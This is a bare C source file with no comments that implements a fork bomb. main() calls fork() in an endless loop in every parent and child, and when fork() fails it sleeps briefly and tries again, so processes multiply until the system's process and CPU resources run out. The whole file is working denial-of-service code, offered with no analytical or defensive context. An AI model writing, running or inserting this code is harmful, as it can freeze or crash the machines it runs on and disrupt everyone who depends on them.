#include <sys/types.h>
#include <time.h>
#include <unistd.h>

int main(void) {
    for (;;) {
        pid_t child = fork();
        if (child == 0) continue;
        if (child < 0) {
            struct timespec delay = {.tv_sec = 0, .tv_nsec = 10000000L};
            nanosleep(&delay, 0);
        }
    }
}
